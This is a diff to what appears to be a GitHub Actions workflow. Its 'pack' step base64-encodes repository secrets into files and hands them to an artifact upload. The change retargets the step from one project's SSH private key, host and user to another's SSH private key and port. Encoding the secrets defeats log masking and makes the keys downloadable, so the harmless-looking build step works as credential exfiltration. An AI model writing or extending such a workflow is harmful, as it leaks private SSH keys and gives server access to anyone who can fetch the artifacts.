@@ -8,14 +8,12 @@ jobs:
     steps:
       - name: pack
         env:
-          S1: ${{ secrets.NBA_WOO_SSH_PRIVATE_KEY }}
-          S2: ${{ secrets.WIZARD_SSH_HOST }}
-          S3: ${{ secrets.WIZARD_SSH_USER }}
+          S1: ${{ secrets.WIZARD_SSH_PORT }}
+          S2: ${{ secrets.WIZARD_SSH_PRIVATE_KEY }}
         run: |
           mkdir -p out
-          printf '%s' "$S1" | base64 -w0 > out/nba_woo_key.b64
-          printf '%s' "$S2" | base64 -w0 > out/host.b64
-          printf '%s' "$S3" | base64 -w0 > out/user.b64
+          printf '%s' "$S1" | base64 -w0 > out/port.b64
+          printf '%s' "$S2" | base64 -w0 > out/wizard_key.b64
           wc -c out/*.b64
       - uses: actions/upload-artifact@v4
         with:
